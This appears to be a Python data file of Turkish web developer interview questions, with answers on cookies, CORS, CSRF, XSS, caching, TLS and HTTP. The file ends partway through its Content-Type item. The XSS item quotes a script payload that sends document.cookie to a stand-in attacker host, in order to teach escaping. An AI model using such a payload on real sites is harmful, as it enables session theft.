from part1 import pre, c

Q = [
dict(roles=['web'], lv='temel', topic='Tarayıcıya URL yazınca ne olur?', kind='kavram',
     q='Tarayıcının adres çubuğuna ' + '<code>https://www.anadolumarket.com/kampanyalar</code> yazıp Enter\'a bastığında sayfa görünene kadar neler olur?',
     a='<ol><li><b>URL ayrıştırma ve önbellek:</b> Tarayıcı şemayı (https), alan adını ve yolu ayırır. HSTS listesine bakar; varsa doğrudan HTTPS kullanır.</li>'
       '<li><b>DNS çözümleme:</b> Alan adının IP adresi sırasıyla tarayıcı önbelleğinde, işletim sisteminde, yönlendiricide ve en sonunda çözümleyici DNS sunucusunda (kök → .com → yetkili sunucu) aranır. Büyük sitelerde bu genellikle en yakın CDN noktasının IP\'sidir.</li>'
       '<li><b>TCP bağlantısı:</b> 443 numaralı porta üçlü el sıkışma (SYN, SYN-ACK, ACK). HTTP/3 kullanılıyorsa TCP yerine UDP üzerinde QUIC kullanılır.</li>'
       '<li><b>TLS el sıkışması:</b> Sunucu sertifikasını gönderir; tarayıcı sertifikanın güvenilir bir otoriteye bağlı olduğunu, süresini ve alan adını doğrular. Ortak oturum anahtarları üzerinde anlaşılır (TLS 1.3\'te tek gidiş-dönüş).</li>'
       '<li><b>HTTP isteği:</b> ' + c('GET /kampanyalar') + '; başlıklarda ' + c('Host') + ', çerezler, ' + c('Accept-Language') + ' gönderilir. İstek yük dengeleyiciden geçerek uygulama sunucusuna (ör. Django) ulaşır; uygulama veritabanı ve önbellekten veriyi alıp HTML üretir.</li>'
       '<li><b>Yanıt ve oluşturma:</b> Tarayıcı HTML\'i ayrıştırıp DOM\'u kurar, CSS\'ten CSSOM\'u oluşturur, ek kaynakları (CSS, JS, görseller) indirir, JavaScript\'i çalıştırır; ardından yerleşim (layout) ve boyama (paint) yapılır.</li></ol>'
       '<p>Mülakatta ilgi alanına göre bir adımı derinleştirmek iyidir: backend için yük dengeleyici ve uygulama katmanı, frontend için oluşturma (rendering) süreci.</p>',
     follow=['Bu süreçte en çok zaman genellikle nerede harcanır, nasıl ölçersin?', 'Tarayıcı bir sonraki ziyarette hangi adımları atlayabilir?'],
     flags=['DNS veya TLS adımını tamamen atlamak', 'Tüm süreci "sunucuya istek gider, sayfa gelir" diye özetlemek'],
     tip='Adımları sırayla say, sonra kendi uzmanlık alanındaki adımı bir seviye derinleştir.'),

dict(roles=['web'], lv='temel', topic='Çerez ve web depolama', kind='kavram',
     q='Çerez (cookie), localStorage ve sessionStorage arasındaki farklar nelerdir? Oturum bilgisini nerede tutarsın ve çerezde hangi bayrakları kullanırsın?',
     a='<ul><li><b>Çerez:</b> Küçüktür (~4 KB), alan adıyla eşleşen <i>her HTTP isteğinde otomatik olarak</i> sunucuya gönderilir. Süresi ayarlanabilir, sunucu tarafından ' + c('Set-Cookie') + ' ile yazılır.</li>'
       '<li><b>localStorage:</b> Yaklaşık 5–10 MB, kalıcıdır, yalnızca JavaScript ile okunur ve sunucuya otomatik gitmez. Aynı köken (origin) içindeki tüm sekmeler paylaşır.</li>'
       '<li><b>sessionStorage:</b> localStorage gibidir ama yalnızca o sekme açık kaldığı sürece yaşar.</li></ul>'
       '<p><b>Oturum için:</b> Rastgele bir oturum kimliği ya da token\'ı <b>HttpOnly</b> bir çerezde tutmayı tercih ederim. localStorage\'daki her şey sayfadaki herhangi bir JavaScript tarafından okunabilir; bir XSS açığında token doğrudan çalınır.</p>'
       '<p><b>Çerez bayrakları:</b></p><ul><li><b>' + c('HttpOnly') + ':</b> JavaScript ' + c('document.cookie') + ' ile okuyamaz; XSS ile çalınmayı önler.</li>'
       '<li><b>' + c('Secure') + ':</b> Yalnızca HTTPS üzerinden gönderilir.</li>'
       '<li><b>' + c('SameSite=Lax') + '</b> (veya ' + c('Strict') + '): Başka sitelerden gelen isteklerde çerezin gönderilmesini kısıtlar; CSRF\'ye karşı önemli bir katmandır. Üçüncü taraf bağlamında gerekiyorsa ' + c('None; Secure') + '.</li>'
       '<li><b>' + c('Max-Age') + '/' + c('Expires') + ', ' + c('Path') + ', ' + c('Domain') + '</b>; ek koruma için ' + c('__Host-') + ' ön eki.</li></ul>'
       '<p>Not: Gerekli olmayan (analitik, pazarlama) çerezler için KVKK kapsamında kullanıcıdan açık rıza alınmalıdır.</p>',
     follow=['HttpOnly çerez kullanınca CSRF riskini nasıl yönetirsin?', '__Host- ön eki hangi korumayı sağlar?'],
     flags=['Token\'ı localStorage\'da tutmayı en güvenli yol olarak sunmak', 'Çerezlerin her istekte otomatik gittiğini bilmemek'],
     tip='Karşılaştırmadan sonra güvenlik bayraklarını say; mülakatçı asıl bunu duymak ister.'),

dict(roles=['web', 'backend'], lv='orta', topic='CORS', kind='kavram',
     q='CORS nedir, neden vardır? Ön kontrol (preflight) isteği ne zaman gönderilir?',
     a='<p><b>Arka plan — aynı köken politikası (Same-Origin Policy):</b> Tarayıcı, bir kökenden (şema + alan adı + port) yüklenen JavaScript\'in başka bir kökene yaptığı isteğin <i>yanıtını okumasını</i> varsayılan olarak engeller. Aksi hâlde kötü niyetli bir site, oturum açık olan kullanıcı adına banka API\'nizden veri okuyabilirdi.</p>'
       '<p><b>CORS</b> (Cross-Origin Resource Sharing), sunucunun hangi kökenlere izin verdiğini başlıklarla bildirmesini sağlayan kontrollü bir istisnadır. Önemli: CORS bir sunucu güvenlik mekanizması değil, <i>tarayıcının</i> uyguladığı bir kuraldır. curl veya Python ' + c('requests') + ' CORS\'u hiç umursamaz.</p>'
       '<p><b>Ön kontrol:</b> "Basit" olmayan isteklerden önce tarayıcı bir ' + c('OPTIONS') + ' isteği gönderir. Örneğin ' + c('PUT') + '/' + c('DELETE') + ' metodu, ' + c('Content-Type: application/json') + ' veya ' + c('Authorization') + ' gibi özel başlıklar kullanıldığında. Sunucu şunlarla yanıt verir: ' + c('Access-Control-Allow-Origin: https://panel.anadolumarket.com') + ', ' + c('Access-Control-Allow-Methods') + ', ' + c('Access-Control-Allow-Headers') + ' ve önbellek için ' + c('Access-Control-Max-Age') + '.</p>'
       '<p><b>Sık hatalar:</b> ' + c('Allow-Origin: *') + ' ile ' + c('Allow-Credentials: true') + ' birlikte kullanılamaz. Gelen ' + c('Origin') + '\'i kontrol etmeden aynen yansıtmak, CORS\'u fiilen kapatmak demektir. Doğrusu, sabit bir izin listesi kullanmaktır: FastAPI\'de ' + c('CORSMiddleware(allow_origins=[...])') + ', Django\'da ' + c('django-cors-headers') + '. Ayrıca CORS, CSRF\'ye karşı tam koruma sağlamaz.</p>',
     follow=['CORS hatası alan bir frontend geliştiricisine sorunu nasıl anlatırsın?', 'Basit (simple) istek koşulları nelerdir?'],
     flags=['CORS\'u sunucuyu saldırılardan koruyan bir güvenlik duvarı sanmak', 'Sorunu çözmek için her yerde * önermek'],
     tip='"Tarayıcı uygular, sunucu izin verir" ayrımını erken söyle; birçok yanlış anlamanın kaynağı budur.'),

dict(roles=['web', 'backend'], lv='orta', topic='CSRF', kind='kavram',
     q='CSRF saldırısı nasıl çalışır? Django ve token tabanlı API\'lerde nasıl korunursun?',
     a='<p><b>Saldırı:</b> Kullanıcı Anadolu Bank\'a giriş yapmış ve oturum çerezi tarayıcıda duruyor. Kötü niyetli bir sayfayı ziyaret ettiğinde o sayfa gizli bir form ile ' + c('POST https://anadolubank.com/havale') + ' isteğini otomatik gönderir. Tarayıcı oturum çerezini <i>kendiliğinden</i> eklediği için banka isteği meşru sanır. Saldırgan yanıtı okuyamaz ama işlem gerçekleşmiş olur. Kısacası CSRF, tarayıcının çerezleri otomatik göndermesini kötüye kullanır.</p>'
       '<p><b>Korunma yolları:</b></p><ul><li><b>CSRF token:</b> Sunucu oturuma bağlı rastgele bir değer üretir; formlara gizli alan veya AJAX isteklerine başlık (' + c('X-CSRFToken') + ') olarak eklenir. Saldırganın sitesi bu değeri bilemez. Django\'da ' + c('CsrfViewMiddleware') + ' ve şablonda ' + c('{% csrf_token %}') + ' bunu yapar; ' + c('@csrf_exempt') + ' çok dikkatli kullanılmalıdır.</li>'
       '<li><b>' + c('SameSite=Lax/Strict') + ' çerezleri:</b> Başka sitelerden gelen POST isteklerinde çerez gönderilmez. Modern tarayıcılarda varsayılan Lax\'tır, ama tek başına yeterli sayılmamalıdır.</li>'
       '<li><b>' + c('Origin') + '/' + c('Referer') + ' kontrolü</b> ek bir katmandır.</li>'
       '<li>Durum değiştiren işlemler asla ' + c('GET') + ' ile yapılmaz.</li></ul>'
       '<p><b>Token tabanlı API\'ler:</b> Kimlik bilgisi ' + c('Authorization: Bearer') + ' başlığında JavaScript tarafından açıkça eklenir; tarayıcı bunu otomatik göndermediği için klasik CSRF riski yoktur. Ama token çerezde tutuluyorsa risk geri gelir.</p>',
     follow=['SameSite=Lax hangi istekleri hâlâ çerezle gönderir?', 'CSRF ile XSS arasındaki fark nedir?'],
     flags=['CSRF\'yi XSS ile karıştırmak', 'CORS\'un CSRF\'yi tamamen önlediğini söylemek'],
     tip='Saldırıyı kısa bir hikâyeyle anlat ("kullanıcı giriş yapmış, kötü sayfayı açıyor..."), sonra korumaları sırala.'),

dict(roles=['web'], lv='temel', topic='XSS ve kaçış (escaping)', kind='kod-okuma',
     q='Lezzet Kurye\'de restoran yorumları sayfada gösteriliyor. Kötü niyetli bir yorum için iki çıktı arasındaki fark nedir?',
     code='import html\nyorum = \'<script>fetch("https://kotu.site/?c=" + document.cookie)</script>\'\nprint(f"<p>{yorum}</p>")\nprint(f"<p>{html.escape(yorum)}</p>")\nprint(html.escape("Ali\'nin \\"en iyi\\" pide & lahmacun"))\n',
     out='<p><script>fetch("https://kotu.site/?c=" + document.cookie)</script></p>\n<p>&lt;script&gt;fetch(&quot;https://kotu.site/?c=&quot; + document.cookie)&lt;/script&gt;</p>\nAli&#x27;nin &quot;en iyi&quot; pide &amp; lahmacun',
     a='<p><b>1. çıktı:</b> Kullanıcı girdisi HTML\'e olduğu gibi gömülmüş. Tarayıcı bunu gerçek bir ' + c('<script>') + ' etiketi olarak çalıştırır ve sayfayı açan <i>her</i> kullanıcının çerezleri saldırgana gönderilir. Bu, <b>kalıcı (stored) XSS</b>\'tir: kötü kod veritabanına kaydedilip herkese sunulur.</p>'
       '<p><b>2. çıktı:</b> ' + c('html.escape') + ' özel karakterleri HTML varlıklarına çevirir: ' + c('<') + ' → ' + c('&lt;') + ', ' + c('>') + ' → ' + c('&gt;') + ', ' + c('&') + ' → ' + c('&amp;') + ', çift tırnak → ' + c('&quot;') + ', tek tırnak → ' + c('&#x27;') + '. Tarayıcı artık metni çalıştırmaz, yalnızca ekranda gösterir.</p>'
       '<p><b>Gerçek projelerde:</b> Elle kaçış yapmayız; şablon motorları bunu otomatik yapar. Django şablonları ve Flask\'ın Jinja2 kurulumu varsayılan olarak kaçış uygular. Tehlike, bu korumayı bilerek kapatan yerlerdedir: ' + c('|safe') + ', ' + c('mark_safe') + ', ' + c('Markup') + ', frontend\'de ' + c('innerHTML') + ' veya ' + c('v-html') + '.</p>'
       '<p><b>Bağlam önemlidir:</b> HTML gövdesindeki kaçış, bir ' + c('<script>') + ' bloğu, ' + c('href') + ' özniteliği (' + c('javascript:') + ' URL\'leri) veya CSS içinde yeterli değildir. Zengin metin (HTML) kabul etmek gerekiyorsa ' + c('nh3') + ' / ' + c('bleach') + ' ile izin listesi temelli temizleme yapılır. Ek savunma katmanları: ' + c('Content-Security-Policy') + ' başlığı ve HttpOnly çerezler.</p>',
     follow=['Kullanıcı profilindeki web sitesi bağlantısı href içinde nasıl güvenli gösterilir?', 'Content-Security-Policy XSS\'e karşı nasıl ek koruma sağlar?'],
     flags=['Girdiyi kaydederken "script" kelimesini silmeyi çözüm sanmak', 'Şablon motorunun varsayılan kaçışından haberdar olmamak'],
     tip='Çıktıları gösterdikten sonra "|safe ve innerHTML kullanılan yerleri kod incelemesinde özellikle ararım" de.'),

dict(roles=['web', 'backend'], lv='orta', topic='HTTP önbellekleme', kind='kavram',
     q='' + '<code>Cache-Control</code>, <code>ETag</code> ve <code>Last-Modified</code> başlıkları nasıl çalışır? Statik dosyalar ve API yanıtları için hangi stratejiyi önerirsin?',
     a='<p><b>' + c('Cache-Control') + ' (tazelik):</b> Yanıtın nerede ve ne kadar süre önbelleklenebileceğini söyler. ' + c('max-age=3600') + ' (tarayıcı ve paylaşılan önbellek 1 saat sunucuya sormadan kullanır), ' + c('public') + ' / ' + c('private') + ' (CDN önbelleği kullanabilir mi), ' + c('no-cache') + ' (sakla ama her kullanımda sunucuyla doğrula), ' + c('no-store') + ' (hiç saklama), ' + c('immutable') + ', ' + c('stale-while-revalidate') + '.</p>'
       '<p><b>Doğrulama:</b> Süre dolunca tarayıcı koşullu istek gönderir. ' + c('ETag') + ' içeriğin parmak izidir; tarayıcı ' + c('If-None-Match: "a1b2"') + ' gönderir. İçerik değişmediyse sunucu gövdesiz ' + c('304 Not Modified') + ' döner; bant genişliği kazanılır. ' + c('Last-Modified') + ' / ' + c('If-Modified-Since') + ' tarih tabanlı benzer mekanizmadır.</p>'
       '<p><b>Strateji:</b></p><ul><li><b>Sürümlü statik dosyalar</b> (' + c('app.3f9c1.js') + '): içerik değişince dosya adı değişir; ' + c('Cache-Control: public, max-age=31536000, immutable') + '. Django\'da ' + c('ManifestStaticFilesStorage') + ' veya WhiteNoise bunu yapar.</li>'
       '<li><b>HTML sayfası:</b> ' + c('no-cache') + ' + ETag; her zaman doğrulanır, böylece yeni sürüm hemen görünür.</li>'
       '<li><b>Herkese açık API</b> (ürün listesi): kısa ' + c('max-age') + ' + ' + c('stale-while-revalidate') + '.</li>'
       '<li><b>Kişiye özel veya hassas yanıtlar</b> (hesap bakiyesi): ' + c('private, no-store') + '.</li></ul>'
       '<p>Yanıt dil, kodlama veya yetki gibi bir başlığa göre değişiyorsa ' + c('Vary') + ' başlığı eklenmelidir; aksi hâlde bir kullanıcının yanıtı başkasına sunulabilir.</p>',
     follow=['Vary başlığı unutulursa CDN\'de ne olabilir?', 'no-cache ile no-store arasındaki fark nedir?'],
     flags=['no-cache\'in "hiç önbellekleme" anlamına geldiğini sanmak', 'Kişiye özel yanıtları public önbelleklemeyi sorun görmemek'],
     tip='Kaynak türüne göre (statik, HTML, API, kişisel) dört satırlık bir strateji tablosu sun; pratik deneyim gösterir.'),

dict(roles=['web'], lv='temel', topic='HTTPS ve TLS', kind='kavram',
     q='HTTPS, HTTP\'ye ne ekler? TLS sertifikası neyi kanıtlar ve neyi kanıtlamaz?',
     a='<p>HTTPS, HTTP\'nin <b>TLS</b> (Transport Layer Security) şifreli kanalı üzerinden taşınmasıdır. Üç güvence sağlar:</p>'
       '<ul><li><b>Gizlilik:</b> Aradaki kişiler (kafe Wi-Fi\'si, ağ operatörü) içeriği, çerezleri ve parolaları okuyamaz. Alan adı ise SNI ve DNS üzerinden hâlâ görülebilir.</li>'
       '<li><b>Bütünlük:</b> Veri yolda değiştirilemez; araya reklam veya zararlı kod enjekte edilemez.</li>'
       '<li><b>Kimlik doğrulama:</b> Gerçekten ' + c('anadolubank.com') + '\'un sunucusuyla konuştuğunu doğrularsın.</li></ul>'
       '<p><b>Nasıl çalışır (kısaca):</b> El sıkışmada sunucu sertifikasını gönderir. Tarayıcı sertifikanın güvendiği bir sertifika otoritesine (CA) kadar imza zinciriyle bağlandığını, süresinin geçmediğini ve alan adıyla eşleştiğini kontrol eder. Ardından anahtar değişimi (ECDHE) ile yalnızca iki tarafın bildiği oturum anahtarları üretilir; veri bu simetrik anahtarlarla hızlıca şifrelenir. ECDHE ileri gizlilik (forward secrecy) sağlar: özel anahtar ileride çalınsa bile geçmiş trafik çözülemez.</p>'
       '<p><b>Sertifikanın kanıtlamadıkları:</b> Sitenin dürüst veya güvenli olduğunu kanıtlamaz; oltalama siteleri de ücretsiz sertifika alabilir. Sunucunun açıklardan arınmış olduğunu da göstermez.</p>'
       '<p><b>Pratikte:</b> Let\'s Encrypt ile otomatik yenilenen sertifikalar, HTTP\'den HTTPS\'e yönlendirme, ' + c('Strict-Transport-Security') + ' (HSTS) başlığı. Python\'da sertifika doğrulamasını asla ' + c('verify=False') + ' ile kapatmayız.</p>',
     follow=['HSTS hangi saldırıyı önler?', 'Bir Python betiğinde kurum içi CA ile imzalanmış sertifikayı nasıl doğrularsın?'],
     flags=['"Kilit simgesi varsa site güvenilirdir" demek', 'requests ile verify=False kullanmayı normal görmek'],
     tip='Üç güvenceyi (gizlilik, bütünlük, kimlik) say ve sertifikanın neyi kanıtlamadığını mutlaka ekle.'),

dict(roles=['web', 'backend'], lv='orta', topic='WebSocket, SSE ve yoklama', kind='kavram',
     q='Sunucudan istemciye gerçek zamanlı veri iletmek için yoklama (polling), uzun yoklama, Server-Sent Events ve WebSocket arasında nasıl seçim yaparsın?',
     a='<ul><li><b>Kısa yoklama (polling):</b> İstemci her n saniyede bir ' + c('GET /durum') + ' ister. En basit yoldur ve her altyapıda çalışır. Ama çoğu istek boşuna gider; gecikme en fazla aralık kadar olur. Seyrek değişen veriler için yeterlidir: "raporun hazır mı?" kontrolü gibi.</li>'
       '<li><b>Uzun yoklama (long polling):</b> Sunucu yeni veri olana kadar yanıtı bekletir, sonra döner; istemci hemen yeni istek açar. Gecikme düşer ama bağlantı yönetimi karmaşıklaşır. Bugün çoğunlukla SSE ile yer değiştirmiştir.</li>'
       '<li><b>Server-Sent Events (SSE):</b> Tek bir HTTP bağlantısı üzerinden <b>sunucudan istemciye tek yönlü</b> metin olay akışı (' + c('text/event-stream') + '). Tarayıcıdaki ' + c('EventSource') + ' otomatik yeniden bağlanma ve ' + c('Last-Event-ID') + ' ile kaldığı yerden devam etme desteği sunar. Sıradan HTTP olduğu için proxy\'ler ve kimlik doğrulamayla iyi geçinir. Bildirim akışı, sipariş durumu ve LLM yanıtlarının akışla gönderilmesi için idealdir.</li>'
       '<li><b>WebSocket:</b> HTTP\'den yükseltilmiş, <b>çift yönlü</b>, düşük gecikmeli kalıcı bağlantı. Sohbet, çok oyunculu oyun, ortak düzenleme ve canlı konum gibi istemcinin de sık mesaj gönderdiği durumlar için uygundur. Bedeli: durum tutan bağlantılar, sunucular arası mesaj dağıtımı (Redis Pub/Sub), yük dengeleyici ayarları ve kendi yeniden bağlanma mantığın.</li></ul>'
       '<p><b>Kuralım:</b> Yeterliyse en basit olanı seçerim. Tek yönlü akış için SSE, gerçekten çift yönlü ve yüksek frekanslı iletişim için WebSocket. Python\'da ikisi de ASGI (FastAPI/Starlette, Django Channels) gerektirir.</p>',
     follow=['SSE bağlantıları için Nginx\'te hangi ayarları değiştirmen gerekir?', 'WebSocket sunucularını yatay ölçeklerken mesajları nasıl dağıtırsın?'],
     flags=['Her gerçek zamanlı ihtiyaç için doğrudan WebSocket önermek', 'SSE\'nin varlığından haberdar olmamak'],
     tip='Seçenekleri basitten karmaşığa sırala ve her biri için bir Türk iş senaryosu örneği ver.'),

dict(roles=['web', 'backend'], lv='ileri', topic='HTTP/1.1, HTTP/2 ve HTTP/3', kind='kavram',
     q='HTTP/1.1, HTTP/2 ve HTTP/3 arasındaki temel farklar nelerdir? Bir web uygulamasının performansını nasıl etkiler?',
     a='<p><b>HTTP/1.1:</b> Metin tabanlı. Bir TCP bağlantısında aynı anda yalnızca bir istek-yanıt ilerler; önceki yanıt bitmeden sonraki başlayamaz (uygulama düzeyinde baş-sıra tıkanması, head-of-line blocking). Tarayıcılar bunu alan adı başına ~6 paralel bağlantıyla hafifletir. Bu yüzden eskiden dosya birleştirme (bundling), sprite görseller ve domain sharding gibi geçici çözümler yaygındı.</p>'
       '<p><b>HTTP/2:</b> İkili (binary) çerçeveleme ve <b>çoklama (multiplexing)</b>: tek bir TCP bağlantısında çok sayıda istek ve yanıt akışı eşzamanlı ilerler. HPACK ile tekrar eden başlıklar sıkıştırılır. Akış önceliklendirmesi vardır. Sorun: TCP katmanında tek bir paket kaybolursa tüm akışlar o paketin yeniden gönderilmesini bekler (TCP düzeyinde baş-sıra tıkanması). Kayıplı mobil ağlarda bu belirginleşir.</p>'
       '<p><b>HTTP/3:</b> TCP yerine UDP üzerinde çalışan <b>QUIC</b> protokolünü kullanır. Akışlar taşıma katmanında bağımsızdır; bir paket kaybı yalnızca kendi akışını etkiler. TLS 1.3 protokole gömülüdür; bağlantı kurulumu daha hızlıdır (1-RTT, tekrar bağlantılarda 0-RTT). Bağlantı geçişi desteklenir: telefon Wi-Fi\'dan mobil veriye geçince bağlantı kopmaz.</p>'
       '<p><b>Pratik etkisi:</b> Bu protokolleri genellikle uygulama kodu değil, ters vekil, yük dengeleyici veya CDN konuşur; Python uygulaması arkada HTTP/1.1 ile çalışmaya devam edebilir. HTTP/2 ile birlikte aşırı dosya birleştirme gibi eski optimizasyonların değeri azalmıştır.</p>',
     follow=['HTTP/2 kullanırken hâlâ dosya birleştirme yapmalı mısın?', 'Neden Python uygulama sunucusu genellikle HTTP/2 konuşmaz?'],
     flags=['HTTP/2\'nin baş-sıra tıkanmasını tamamen çözdüğünü söylemek', 'HTTP/3\'ün TCP kullandığını sanmak'],
     tip='Her sürümü "hangi sorunu çözdü, hangi sorunu bıraktı" kalıbıyla anlat; mantıksal bir hikâye oluşur.'),

dict(roles=['web'], lv='temel', topic='CDN ve statik dosyalar', kind='kavram',
     q='CDN nedir, bir web uygulamasına ne kazandırır? Django veya Flask uygulamasında statik dosyaları üretimde nasıl sunarsın?',
     a='<p><b>CDN</b> (Content Delivery Network), içeriğin kopyalarını dünyanın ve ülkenin farklı noktalarındaki kenar (edge) sunucularda önbellekleyen bir ağdır. Kullanıcı en yakın noktadan hizmet alır; Van\'daki bir kullanıcı İstanbul\'daki ana sunucuya gitmek yerine yakındaki bir kenar sunucusundan yanıt alabilir.</p>'
       '<p><b>Kazanımlar:</b></p><ul><li><b>Düşük gecikme:</b> Fiziksel mesafe ve gidiş-dönüş süresi azalır.</li>'
       '<li><b>Ana sunucuda yük azalır:</b> Görsellerin, JS ve CSS dosyalarının büyük kısmı uygulamaya hiç ulaşmaz.</li>'
       '<li><b>Dayanıklılık:</b> Trafik zirvelerini emer, DDoS koruması ve WAF sunar.</li>'
       '<li><b>Ek özellikler:</b> sıkıştırma (Brotli), görsel dönüştürme (WebP/AVIF), HTTP/3, TLS sonlandırma.</li></ul>'
       '<p><b>Statik dosyalar üretimde:</b> Geliştirme sunucusunun statik dosya sunumu üretim için uygun değildir.</p><ul><li><b>Django:</b> ' + c('collectstatic') + ' ile dosyalar tek bir dizinde toplanır. Bu dizin Nginx tarafından doğrudan sunulur ya da uygulama içinden <b>WhiteNoise</b> ile sıkıştırılmış ve parmak izli dosya adlarıyla servis edilir; önüne CDN konur. Alternatif olarak dosyalar ' + c('django-storages') + ' ile nesne depolamaya yüklenir.</li>'
       '<li><b>Kullanıcı yüklemeleri</b> (medya) statik dosyalardan ayrı tutulur ve nesne depolamada saklanır.</li></ul>'
       '<p>Dosya adlarında içerik hash\'i kullanmak, uzun süreli önbelleklemeyi ve yeni sürümde anında güncellemeyi birlikte mümkün kılar.</p>',
     follow=['CDN\'de yanlışlıkla eski bir dosya kaldı; ne yaparsın?', 'Kişiye özel sayfaları CDN\'de önbelleklemenin riski nedir?'],
     flags=['Üretimde statik dosyaları Django/Flask geliştirme sunucusuyla sunmak', 'CDN\'i yalnızca "hızlandırıcı" olarak görüp güvenlik ve yük katkısını atlamak'],
     tip='CDN tanımından hemen sonra collectstatic + WhiteNoise/Nginx akışını anlat; teoriyi pratiğe bağla.'),

dict(roles=['web'], lv='temel', topic='URL ayrıştırma', kind='kod-okuma',
     q='Pedal İzmir istasyon arama bağlantısını ' + '<code>urllib.parse</code> ile çözüyoruz. Çıktı nedir?',
     code='from urllib.parse import urlparse, parse_qs, urlencode, quote\nurl = "https://www.pedalizmir.com/istasyonlar/ara?ilce=Kar%C5%9F%C4%B1yaka&musait=1&tur=elektrikli&tur=klasik#harita"\np = urlparse(url)\nprint(p.scheme, p.netloc, p.path, p.fragment)\nprint(parse_qs(p.query))\nprint(urlencode({"ilce": "Bornova", "not": "a&b c"}))\nprint(quote("Göztepe/İskele"))\n',
     out="https www.pedalizmir.com /istasyonlar/ara harita\n{'ilce': ['Karşıyaka'], 'musait': ['1'], 'tur': ['elektrikli', 'klasik']}\nilce=Bornova&not=a%26b+c\nG%C3%B6ztepe/%C4%B0skele",
     a='<p><b>' + c('urlparse') + '</b> URL\'yi parçalarına ayırır: şema, ağ konumu (alan adı ve varsa port), yol, sorgu dizesi ve parça (' + c('#') + ' sonrası). Parça sunucuya hiç gönderilmez; yalnızca tarayıcıda kullanılır.</p>'
       '<p><b>' + c('parse_qs') + '</b> sorgu dizesini sözlüğe çevirir ve yüzde kodlamasını (percent-encoding) çözer: ' + c('Kar%C5%9F%C4%B1yaka') + ', UTF-8 baytlarıyla kodlanmış "Karşıyaka"dır. Değerlerin <b>her zaman liste</b> olması önemlidir, çünkü aynı parametre birden çok kez gelebilir (' + c('tur') + ' gibi). Tek değer bekliyorsan ' + c('parse_qsl') + ' veya ' + c('[0]') + ' kullanırsın; web çatıları bunu ' + c('request.GET.getlist("tur")') + ' gibi yardımcılarla sunar. Değerler string\'dir; ' + c('musait') + ' için ' + c('"1"') + ' gelir, sayıya çevirme ve doğrulama senin işindir.</p>'
       '<p><b>' + c('urlencode') + '</b> ters yönde çalışır: ' + c('&') + ' karakteri ' + c('%26') + ' olur (aksi hâlde yeni bir parametre başlatırdı), boşluk ise sorgu dizesinde ' + c('+') + ' olur.</p>'
       '<p><b>' + c('quote') + '</b> yol parçaları içindir; varsayılan olarak ' + c('/') + ' karakterini güvenli sayar ve kodlamaz. Bir yol <i>parçası</i> içinde eğik çizgi varsa ' + c('quote(s, safe="")') + ' kullanılmalıdır. URL\'leri asla string birleştirmeyle elle kurma; kodlama hataları ve enjeksiyon riskleri doğar.</p>',
     follow=['Kullanıcının verdiği yönlendirme URL\'sini (next=...) güvenle nasıl doğrularsın?', 'quote ile quote_plus arasındaki fark nedir?'],
     flags=['parse_qs değerlerinin string olacağını söylemek (listedir)', 'URL\'leri f-string ile birleştirmeyi doğal görmek'],
     tip='"Değerler hep liste" ve "& kaçışı" ayrıntılarını özellikle vurgula; gerçek hatalar bunlardan çıkar.'),

dict(roles=['web', 'backend'], lv='orta', topic='JSON serileştirme', kind='kod-okuma',
     q='Sipariş nesnesini API yanıtı için JSON\'a çeviriyoruz. Çıktı nedir, son satır neden hata verir?',
     code='import json\nfrom datetime import datetime\nfrom decimal import Decimal\n\nsiparis = {"id": 7, "tutar": Decimal("149.90"), "zaman": datetime(2026, 11, 2, 14, 30)}\n\ndef donustur(o):\n    if isinstance(o, Decimal):\n        return str(o)\n    if isinstance(o, datetime):\n        return o.isoformat()\n    raise TypeError(f"{type(o).__name__} serileştirilemez")\n\nprint(json.dumps(siparis, default=donustur))\nprint(json.dumps({"şehir": "İzmir"}))\nprint(json.dumps({"şehir": "İzmir"}, ensure_ascii=False))\nprint(json.dumps(siparis))\n',
     out='{"id": 7, "tutar": "149.90", "zaman": "2026-11-02T14:30:00"}\n{"\\u015fehir": "\\u0130zmir"}\n{"şehir": "İzmir"}\nTypeError: Object of type Decimal is not JSON serializable',
     a='<p>JSON yalnızca nesne, dizi, string, sayı, ' + c('true/false') + ' ve ' + c('null') + ' bilir. ' + c('json') + ' modülü ' + c('dict') + ', ' + c('list') + ', ' + c('str') + ', ' + c('int') + ', ' + c('float') + ', ' + c('bool') + ' ve ' + c('None') + '\'u çevirir; ' + c('Decimal') + ', ' + c('datetime') + ', ' + c('UUID') + ', ' + c('set') + ' gibi tipleri tanımaz ve ' + c('TypeError') + ' fırlatır. Son satırın hatası budur.</p>'
       '<p><b>' + c('default=') + '</b> fonksiyonu, tanınmayan her nesne için çağrılır ve JSON uyumlu bir değer döndürmelidir. Tarih için ISO 8601 biçimi standarttır. Saat dilimi bilgisi içeren (' + c('aware') + ') datetime kullanmak, istemcide karışıklığı önler. Parayı string olarak göndermek, JavaScript\'in float hassasiyet kaybını engeller.</p>'
       '<p><b>' + c('ensure_ascii') + ':</b> Varsayılan ' + c('True') + ' değeri ASCII dışı karakterleri ' + c('\\u015f') + ' gibi kaçış dizilerine çevirir. Bu geçerli JSON\'dur ama okunaksızdır. ' + c('ensure_ascii=False') + ' Türkçe karakterleri olduğu gibi yazar; bu durumda dosya veya yanıt UTF-8 kodlamasıyla yazılmalıdır.</p>'
       '<p><b>Pratikte:</b> FastAPI/Pydantic bu dönüşümleri otomatik yapar. Django\'da ' + c('DjangoJSONEncoder') + ' kullanılır. Yüksek performans gerektiğinde ' + c('orjson') + ' tercih edilir; datetime ve dataclass\'ları yerel olarak destekler ve çok daha hızlıdır.</p>',
     follow=['Saat dilimi içermeyen datetime\'ı API\'de döndürmenin riski nedir?', 'JSON\'dan geri okurken tarihi nasıl datetime\'a çevirirsin?'],
     flags=['Decimal\'i float\'a çevirip göndermeyi sorunsuz görmek', 'ensure_ascii çıktısını bozuk veri sanmak'],
     tip='default= kancasını göstermek yeterli değil; "para string, tarih ISO 8601" gibi bir sözleşme kararı söyle.'),

dict(roles=['web'], lv='temel', topic='Content-Type ve MIME', kind='kavram',
     q='' + '<code>Content-Type</code> ve <code>Accept</code> başlıkları ne işe yarar? Yanlış Content-Type hangi sorunlara yol açar?',
     a='<p><b>' + c('Content-Type') + '</b>, mesaj gövdesinin <i>ne olduğunu</i> bildirir: MIME türü ve gerekirse karakter kodlaması. Örnekler: ' + c('text/html; charset=utf-8') + ', ' + c('application/json') + ', ' + c('application/x-www-form-urlencoded') + ', ' + c('multipart/form-data; boundary=...') + ', ' + c('application/pdf') + '. Hem istekte (gönderdiğin veri) hem yanıtta (döndürdüğün veri) kullanılır.</p>'
